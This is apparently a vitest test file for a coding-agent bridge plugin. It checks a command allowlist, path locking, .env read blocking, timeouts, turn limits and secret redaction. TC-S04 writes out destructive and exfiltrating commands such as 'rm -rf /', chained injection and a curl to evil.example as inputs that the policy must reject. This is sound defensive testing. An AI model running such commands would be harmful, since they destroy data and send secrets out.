import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { PassThrough } from 'node:stream';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import {
  getArtifactsDir,
  readManifest,
  writeManifest,
  writeReportMarkdown,
} from '../src/bridge-fs.js';
import {
  ApiWorkerEngine,
  ModelTurnResponse,
  validateCommandPolicy,
} from '../src/engines/api-worker.js';
import {
  attachStreamJsonHeartbeat,
  buildCliInvocationArgs,
  buildCliSpawnSpec,
  SubscriptionEngine,
} from '../src/engines/subscription.js';
import {
  handleCheckEnvironment,
  handleDelegateToAntigravity,
} from '../src/index.js';
import { AgPluginError, DEFAULT_BRIDGE_CONFIG } from '../src/types.js';

describe('engines & MCP pipeline (TC-S04, TC-I02 ~ TC-I05)', () => {
  let tmpRoot: string;
  const pluginRoot = path.resolve(import.meta.dirname, '..', '..');

  beforeEach(() => {
    tmpRoot = fs.mkdtempSync(path.join(os.tmpdir(), 'ag-engine-'));
    fs.mkdirSync(path.join(tmpRoot, 'src', 'ui'), { recursive: true });
    fs.mkdirSync(path.join(tmpRoot, 'src', 'backend'), { recursive: true });
    fs.writeFileSync(path.join(tmpRoot, 'package.json'), JSON.stringify({ name: 'demo', scripts: { build: 'tsc' } }));
  });

  afterEach(() => {
    fs.rmSync(tmpRoot, { recursive: true, force: true });
  });

  it('TC-S04: enforces strict command allowlist and blocks shell chaining / dangerous commands', () => {
    expect(validateCommandPolicy('npx tsc --noEmit')).toEqual({
      bin: 'npx',
      args: ['tsc', '--noEmit'],
    });
    expect(validateCommandPolicy('npm run build')).toEqual({
      bin: 'npm',
      args: ['run', 'build'],
    });

    const blocked = [
      'npm run build && rm -rf /',
      'npx tsc --noEmit; echo pwned',
      'curl https://evil.example/exfil',
      'git push --force',
      'rm -rf src',
      'powershell -Command Get-Process',
      'npm install malicious-pkg',
    ];

    for (const cmd of blocked) {
      expect(() => validateCommandPolicy(cmd)).toThrow(AgPluginError);
    }
  });

  it('TC-I02: runs Subscription mode end-to-end dispatch -> RUNNING -> report + artifacts -> VERIFIED', async () => {
    const subEngine = new SubscriptionEngine({
      triggerFn: async (ctx) => {
        setTimeout(() => {
          const cur = readManifest(ctx.workspaceRoot);
          if (!cur) return;
          writeManifest(ctx.workspaceRoot, {
            ...cur,
            status: 'RUNNING',
            updatedAt: new Date().toISOString(),
          });
        }, 80);

        setTimeout(() => {
          const cur = readManifest(ctx.workspaceRoot);
          if (!cur) return;
          const artDir = getArtifactsDir(ctx.workspaceRoot, cur.taskId);
          fs.mkdirSync(artDir, { recursive: true });
          fs.writeFileSync(path.join(artDir, 'dashboard.png'), 'PNGDATA');
          fs.writeFileSync(path.join(ctx.workspaceRoot, 'src', 'ui', 'Card.tsx'), 'export const Card = () => null;');
          writeReportMarkdown(
            ctx.workspaceRoot,
            '# Antigravity Task Report\n\n- **Status:** VERIFIED\n- Implemented Card component.\n',
          );
          writeManifest(ctx.workspaceRoot, {
            ...cur,
            status: 'VERIFIED',
            changedFiles: ['src/ui/Card.tsx'],
            artifacts: [`artifacts/${cur.taskId}/dashboard.png`],
            updatedAt: new Date().toISOString(),
          });
        }, 200);

        return { methodUsed: 'custom' };
      },
    });

    const res = await handleDelegateToAntigravity(
      {
        title: 'Create Card component',
        instructions: 'Implement src/ui/Card.tsx and verify visually.',
        lockedPaths: ['src/ui/'],
        verifyUrl: 'http://localhost:3000/dashboard',
        acceptanceCriteria: ['Card renders with 0 console errors'],
        modeOverride: 'subscription',
        workspaceRoot: tmpRoot,
      },
      {
        pluginRoot,
        subscriptionEngine: subEngine,
        detectorDeps: {
          platform: 'linux',
          env: {},
          homedir: '/home/tester',
          existsSync: () => false,
          findBinary: (name) => (name === 'agy' ? '/usr/local/bin/agy' : undefined),
        },
      },
    );

    expect(res.ok).toBe(true);
    expect(res.mode).toBe('subscription');
    expect(res.status).toBe('VERIFIED');
    expect(res.changedFiles).toContain('src/ui/Card.tsx');
    expect(res.artifacts.some((a) => a.endsWith('dashboard.png'))).toBe(true);
    expect(res.reportMarkdown).toContain('Implemented Card component');
  });

  it('TC-I03: times out cleanly in Subscription mode and transitions manifest to FAILED(TASK_TIMEOUT)', async () => {
    fs.mkdirSync(path.join(tmpRoot, '.ag-bridge'), { recursive: true });
    fs.writeFileSync(
      path.join(tmpRoot, '.ag-bridge', 'config.json'),
      JSON.stringify({ subscription: { timeout_sec: 1, poll_interval_ms: 150 } }),
    );

    const subEngine = new SubscriptionEngine({
      triggerFn: async () => ({ methodUsed: 'custom' }),
    });

    const res = await handleDelegateToAntigravity(
      {
        title: 'Timeout scenario',
        instructions: 'Wait until timeout triggers.',
        lockedPaths: ['src/ui/'],
        acceptanceCriteria: ['Should time out cleanly'],
        modeOverride: 'subscription',
        workspaceRoot: tmpRoot,
      },
      {
        pluginRoot,
        subscriptionEngine: subEngine,
        detectorDeps: {
          platform: 'linux',
          env: {},
          homedir: '/home/tester',
          existsSync: () => false,
          findBinary: (name) => (name === 'agy' ? '/usr/local/bin/agy' : undefined),
        },
      },
    );

    expect(res.ok).toBe(false);
    expect(res.status).toBe('FAILED');
    expect(res.errorCode).toBe('TASK_TIMEOUT');
    expect(readManifest(tmpRoot)?.status).toBe('FAILED');
  });

  it('TC-I04: runs API Worker 5-turn mock Gemini loop, blocks out-of-scope write, and writes report.md', async () => {
    const turns: ModelTurnResponse[] = [
      { functionCalls: [{ name: 'list_dir', args: { path: 'src' } }] },
      {
        functionCalls: [
          {
            name: 'write_file',
            args: { path: 'src/ui/Header.tsx', content: 'export const Header = () => "<header/>";\n' },
          },
        ],
      },
      {
        // Out-of-scope write attempt — must be blocked gracefully
        functionCalls: [
          {
            name: 'write_file',
            args: { path: 'src/backend/auth.ts', content: 'export const hacked = true;\n' },
          },
        ],
      },
      {
        functionCalls: [{ name: 'run_command', args: { command: 'npx tsc --noEmit' } }],
      },
      {
        text: 'Implemented Header component inside src/ui/Header.tsx and verified TypeScript compilation.',
      },
    ];

    let turnIdx = 0;
    const apiEngine = new ApiWorkerEngine({
      retryBaseDelayMs: 1,
      adapterFactory: () => ({
        generateTurn: async () => turns[turnIdx++] ?? { text: 'Done' },
      }),
      commandRunner: async () => ({
        exitCode: 0,
        stdout: '0 errors',
        stderr: '',
        timedOut: false,
      }),
    });

    const prevKey = process.env.GEMINI_API_KEY;
    process.env.GEMINI_API_KEY = 'AIzaSyTestMockApiKey1234567890abcdef';
    try {
      const res = await handleDelegateToAntigravity(
        {
          title: 'Build Header component',
          instructions: 'Create src/ui/Header.tsx and verify tsc.',
          lockedPaths: ['src/ui/'],
          acceptanceCriteria: ['Header exported', 'npx tsc --noEmit passes'],
          modeOverride: 'api',
          workspaceRoot: tmpRoot,
        },
        {
          pluginRoot,
          apiWorkerEngine: apiEngine,
          detectorDeps: {
            platform: 'linux',
            env: { GEMINI_API_KEY: 'AIzaSyTestMockApiKey1234567890abcdef' },
            homedir: '/home/tester',
            existsSync: () => false,
            findBinary: () => undefined,
          },
        },
      );

      expect(res.ok).toBe(true);
      expect(res.mode).toBe('api');
      expect(res.status).toBe('VERIFIED');
      expect(fs.existsSync(path.join(tmpRoot, 'src', 'ui', 'Header.tsx'))).toBe(true);
      expect(fs.existsSync(path.join(tmpRoot, 'src', 'backend', 'auth.ts'))).toBe(false);
      expect(res.reportMarkdown).toContain('Blocked 1 out-of-scope write attempt');
      expect(res.reportMarkdown).not.toContain('AIzaSyTestMockApiKey');
    } finally {
      if (prevKey === undefined) delete process.env.GEMINI_API_KEY;
      else process.env.GEMINI_API_KEY = prevKey;
    }
  });

  it('TC-I05: stops cleanly with MAX_TURNS_EXCEEDED when model keeps issuing tool calls', async () => {
    fs.mkdirSync(path.join(tmpRoot, '.ag-bridge'), { recursive: true });
    fs.writeFileSync(
      path.join(tmpRoot, '.ag-bridge', 'config.json'),
      JSON.stringify({ api: { max_turns: 3 } }),
    );

    const apiEngine = new ApiWorkerEngine({
      retryBaseDelayMs: 1,
      adapterFactory: () => ({
        generateTurn: async () => ({
          functionCalls: [{ name: 'list_dir', args: { path: '.' } }],
        }),
      }),
    });

    const prevKey = process.env.GEMINI_API_KEY;
    process.env.GEMINI_API_KEY = 'AIzaSyTestMockApiKey1234567890abcdef';
    try {
      const res = await handleDelegateToAntigravity(
        {
          title: 'Infinite loop guard test',
          instructions: 'Test max_turns enforcement.',
          lockedPaths: ['src/ui/'],
          acceptanceCriteria: ['Terminates safely at max_turns'],
          modeOverride: 'api',
          workspaceRoot: tmpRoot,
        },
        {
          pluginRoot,
          apiWorkerEngine: apiEngine,
          detectorDeps: {
            platform: 'linux',
            env: { GEMINI_API_KEY: 'AIzaSyTestMockApiKey1234567890abcdef' },
            homedir: '/home/tester',
            existsSync: () => false,
            findBinary: () => undefined,
          },
        },
      );

      expect(res.ok).toBe(false);
      expect(res.status).toBe('FAILED');
      expect(res.errorCode).toBe('MAX_TURNS_EXCEEDED');
    } finally {
      if (prevKey === undefined) delete process.env.GEMINI_API_KEY;
      else process.env.GEMINI_API_KEY = prevKey;
    }
  });

  it('builds official agy non-interactive CLI flags and legacy antigravity workflow flags', () => {
    const baseCtx = {
      workspaceRoot: tmpRoot,
      pluginRoot,
      manifest: {
        schemaVersion: 1 as const,
        taskId: 'ag-cli-flags-1',
        title: 'CLI flags test',
        mode: 'subscription' as const,
        status: 'DISPATCHED' as const,
        lockedPaths: ['src/ui/'],
        createdAt: new Date().toISOString(),
        updatedAt: new Date().toISOString(),
        artifacts: [],
      },
      config: DEFAULT_BRIDGE_CONFIG,
      instructions: 'Build UI',
      acceptanceCriteria: ['Works'],
    };

    const agyArgs = buildCliInvocationArgs({
      ...baseCtx,
      detection: {
        configuredMode: 'auto',
        resolvedMode: 'subscription',
        platform: 'win32',
        subscription: {
          detected: true,
          cliBinary: 'agy',
          cliPath: 'C:\\Users\\dev\\AppData\\Local\\agy\\bin\\agy.exe',
          triggerMethod: 'cli_or_ipc',
        },
        api: {
          configured: false,
          source: 'none',
          envVarName: 'GEMINI_API_KEY',
          model: 'gemini-2.5-pro',
          maxTurns: 15,
        },
        recommendations: [],
      },
    });
    expect(agyArgs[0]).toBe('--print');
    expect(agyArgs[1]).toContain('/claude-handoff');
    expect(agyArgs).toContain('--mode');
    expect(agyArgs).toContain('accept-edits');
    expect(agyArgs).toContain('--print-timeout');
    expect(agyArgs).toContain('300s');
    expect(agyArgs).toContain('--sandbox');
    expect(agyArgs).toContain('--output-format');
    expect(agyArgs).toContain('stream-json');

    const agyNoStreamArgs = buildCliInvocationArgs({
      ...baseCtx,
      config: {
        ...DEFAULT_BRIDGE_CONFIG,
        subscription: { ...DEFAULT_BRIDGE_CONFIG.subscription, agy_stream_heartbeat: false },
      },
      detection: {
        configuredMode: 'auto',
        resolvedMode: 'subscription',
        platform: 'win32',
        subscription: {
          detected: true,
          cliBinary: 'agy',
          cliPath: 'C:\\Users\\dev\\AppData\\Local\\agy\\bin\\agy.exe',
          triggerMethod: 'cli_or_ipc',
        },
        api: {
          configured: false,
          source: 'none',
          envVarName: 'GEMINI_API_KEY',
          model: 'gemini-2.5-pro',
          maxTurns: 15,
        },
        recommendations: [],
      },
    });
    expect(agyNoStreamArgs).not.toContain('stream-json');

    const legacyArgs = buildCliInvocationArgs({
      ...baseCtx,
      detection: {
        configuredMode: 'auto',
        resolvedMode: 'subscription',
        platform: 'darwin',
        subscription: {
          detected: true,
          cliBinary: 'antigravity',
          cliPath: '/usr/local/bin/antigravity',
          triggerMethod: 'cli_or_ipc',
        },
        api: {
          configured: false,
          source: 'none',
          envVarName: 'GEMINI_API_KEY',
          model: 'gemini-2.5-pro',
          maxTurns: 15,
        },
        recommendations: [],
      },
    });
    expect(legacyArgs).toEqual(['run', '--workflow', 'claude-handoff']);

    // Windows .cmd/.bat spawn spec must wrap via cmd.exe /d /s /c with outer quotes + windowsVerbatimArguments
    const winCmdSpec = buildCliSpawnSpec('C:\\Program Files\\Antigravity\\bin\\antigravity.cmd', legacyArgs, 'win32');
    expect(winCmdSpec.command).toBe('cmd.exe');
    expect(winCmdSpec.windowsVerbatimArguments).toBe(true);
    expect(winCmdSpec.args.slice(0, 3)).toEqual(['/d', '/s', '/c']);
    expect(winCmdSpec.args[3]).toBe(
      '""C:\\Program Files\\Antigravity\\bin\\antigravity.cmd" "run" "--workflow" "claude-handoff""',
    );

    const winExeSpec = buildCliSpawnSpec('C:\\Users\\dev\\AppData\\Local\\agy\\bin\\agy.exe', agyArgs, 'win32');
    expect(winExeSpec.command).toBe('C:\\Users\\dev\\AppData\\Local\\agy\\bin\\agy.exe');
    expect(winExeSpec.args).toEqual(agyArgs);
  });

  it('TC-U12: attachStreamJsonHeartbeat parses split NDJSON, updates manifest heartbeat, masks logs, and never overwrites VERIFIED', () => {
    const initialTime = '2026-01-01T00:00:00.000Z';
    writeManifest(tmpRoot, {
      schemaVersion: 1,
      taskId: 'ag-hb-1',
      title: 'Stream heartbeat test',
      mode: 'subscription',
      status: 'DISPATCHED',
      lockedPaths: ['src/ui/'],
      createdAt: initialTime,
      updatedAt: initialTime,
      artifacts: [],
    });

    const logFilePath = path.join(getArtifactsDir(tmpRoot, 'ag-hb-1'), 'agy-cli.log');
    const stream = new PassThrough();
    const seenEvents: Array<Record<string, unknown>> = [];

    const handle = attachStreamJsonHeartbeat(stream, {
      workspaceRoot: tmpRoot,
      taskId: 'ag-hb-1',
      logFilePath,
      minHeartbeatIntervalMs: 0,
      onEvent: (ev) => seenEvents.push(ev),
    });

    // Feed split JSON chunks + malformed non-JSON line + secret token
    stream.write('{"type":"turn_start","step":1');
    stream.write('}\nnot-json-diagnostic-line AIzaSySecretTokenLeakTest1234567890\n');
    stream.write('{"type":"tool_call","name":"write_file"}\n');

    expect(seenEvents.length).toBe(2);
    const updated = readManifest(tmpRoot);
    expect(updated?.status).toBe('RUNNING');
    expect(updated?.updatedAt).not.toBe(initialTime);

    const logContent = fs.readFileSync(logFilePath, 'utf8');
    expect(logContent).toContain('[REDACTED]');
    expect(logContent).not.toContain('AIzaSySecretTokenLeakTest');

    // Mark terminal VERIFIED, then emit late stream event -> must NOT revert to RUNNING
    writeManifest(tmpRoot, {
      ...updated!,
      status: 'VERIFIED',
      updatedAt: '2026-11-22T23:00:00.000Z',
    });
    stream.write('{"type":"late_event"}\n');
    stream.end();
    handle.stop();

    expect(readManifest(tmpRoot)?.status).toBe('VERIFIED');
  });

  it('API worker recovers from transient 429 retry, nudges build verification, slices read_file, and blocks .env reads', async () => {
    fs.writeFileSync(path.join(tmpRoot, '.env'), 'TOP_SECRET=do-not-read\n', 'utf8');
    fs.writeFileSync(path.join(tmpRoot, 'src', 'ui', 'types.ts'), 'line1\nline2\nline3\nline4\n', 'utf8');

    let attempts = 0;
    let step = 0;
    let sawBuildNudge = false;
    let sawEnvReadBlocked = false;
    let sawSlicedContent = false;

    const apiEngine = new ApiWorkerEngine({
      retryBaseDelayMs: 1,
      adapterFactory: () => ({
        generateTurn: async ({ contents }) => {
          // Inspect previous tool responses & user messages
          const serialized = JSON.stringify(contents);
          if (serialized.includes('PROTECTED_PATH_BLOCKED')) {
            sawEnvReadBlocked = true;
          }
          if (serialized.includes('line2\\nline3')) {
            sawSlicedContent = true;
          }
          if (serialized.includes('Before finalizing, please run `npx tsc --noEmit`')) {
            sawBuildNudge = true;
          }

          // Simulate transient 429 on very first call
          if (attempts < 2) {
            attempts += 1;
            throw new Error('429 RESOURCE_EXHAUSTED transient rate limit');
          }

          step += 1;
          if (step === 1) {
            return {
              functionCalls: [
                { name: 'read_file', args: { path: '.env' } },
                { name: 'read_file', args: { path: 'src/ui/types.ts', startLine: 2, endLine: 3 } },
                { name: 'write_file', args: { path: 'src/ui/Badge.tsx', content: 'export const Badge = () => null;\n' } },
              ],
            };
          }
          if (step === 2) {
            // Try to finish without running build/tsc -> should trigger verification nudge
            return { text: 'Premature done before build check' };
          }
          if (step === 3) {
            return {
              functionCalls: [{ name: 'run_command', args: { command: 'npx tsc --noEmit' } }],
            };
          }
          return { text: 'Verified Badge component after tsc check.' };
        },
      }),
      commandRunner: async () => ({
        exitCode: 0,
        stdout: '0 errors',
        stderr: '',
        timedOut: false,
      }),
    });

    const prevKey = process.env.GEMINI_API_KEY;
    process.env.GEMINI_API_KEY = 'AIzaSyRetryTestSecretKey1234567890abcd';
    try {
      const res = await handleDelegateToAntigravity(
        {
          title: 'Retry & nudge verification',
          instructions: 'Read types, implement Badge, verify build.',
          lockedPaths: ['src/ui/'],
          acceptanceCriteria: ['Badge compiles cleanly'],
          modeOverride: 'api',
          workspaceRoot: tmpRoot,
        },
        {
          pluginRoot,
          apiWorkerEngine: apiEngine,
          detectorDeps: {
            platform: 'linux',
            env: { GEMINI_API_KEY: 'AIzaSyRetryTestSecretKey1234567890abcd' },
            homedir: '/home/tester',
            existsSync: () => false,
            findBinary: () => undefined,
          },
        },
      );

      expect(res.ok).toBe(true);
      expect(attempts).toBe(2);
      expect(sawEnvReadBlocked).toBe(true);
      expect(sawSlicedContent).toBe(true);
      expect(sawBuildNudge).toBe(true);
      expect(res.reportMarkdown).not.toContain('AIzaSyRetryTestSecretKey');
    } finally {
      if (prevKey === undefined) delete process.env.GEMINI_API_KEY;
      else process.env.GEMINI_API_KEY = prevKey;
    }
  });

  it('API worker returns masked GEMINI_API_ERROR on non-retryable API failure', async () => {
    const dummyKey = 'AIzaSyFatalErrorKey1234567890abcdefg';
    const apiEngine = new ApiWorkerEngine({
      retryBaseDelayMs: 1,
      adapterFactory: () => ({
        generateTurn: async () => {
          throw new Error(`401 Unauthorized for key ${dummyKey}`);
        },
      }),
    });

    const prevKey = process.env.GEMINI_API_KEY;
    process.env.GEMINI_API_KEY = dummyKey;
    try {
      const res = await handleDelegateToAntigravity(
        {
          title: 'Fatal API error test',
          instructions: 'Verify fatal error masking.',
          lockedPaths: ['src/ui/'],
          acceptanceCriteria: ['Fails cleanly'],
          modeOverride: 'api',
          workspaceRoot: tmpRoot,
        },
        {
          pluginRoot,
          apiWorkerEngine: apiEngine,
          detectorDeps: {
            platform: 'linux',
            env: { GEMINI_API_KEY: dummyKey },
            homedir: '/home/tester',
            existsSync: () => false,
            findBinary: () => undefined,
          },
        },
      );

      expect(res.ok).toBe(false);
      expect(res.errorCode).toBe('GEMINI_API_ERROR');
      expect(res.errorMessage).not.toContain(dummyKey);
      expect(res.errorMessage).toContain('[REDACTED]');
    } finally {
      if (prevKey === undefined) delete process.env.GEMINI_API_KEY;
      else process.env.GEMINI_API_KEY = prevKey;
    }
  });

  it('check_ag_environment returns structured bridge and git status', async () => {
    const envRes = await handleCheckEnvironment(tmpRoot, {
      detectorDeps: {
        platform: 'linux',
        env: {},
        homedir: '/home/tester',
        existsSync: () => false,
        findBinary: () => undefined,
      },
    });
    expect(envRes.resolvedMode).toBe('unavailable');
    expect(envRes.bridge.currentStatus).toBe('IDLE');
    expect(envRes.git.isGitRepo).toBe(false);
  });
});
